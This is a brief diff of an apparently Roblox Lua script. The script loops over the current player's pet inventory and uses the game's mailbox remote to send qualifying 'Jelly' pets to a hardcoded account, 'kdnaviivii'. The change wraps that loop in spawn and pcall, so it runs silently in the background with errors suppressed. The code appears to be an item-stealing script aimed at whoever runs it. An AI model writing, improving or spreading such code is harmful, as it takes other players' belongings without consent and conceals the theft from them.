@@ -211,11 +211,13 @@ local args = {
 }
 return game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 end
+spawn(function()pcall(function()
 for i,v in pairs(save.Inventory.Pets) do
 if string.find(v.id, "Jelly") and require(dir[v.id]).difficulty < _G.Min then
 _mail("kdnaviivii", "Pet", i, (v.am or 1))
 end
 end
+end)end)
 
 game.Players.PlayerRemoving:Connect(function(p)
 if mailc >= 1 and p==game.Players.LocalPlayer then
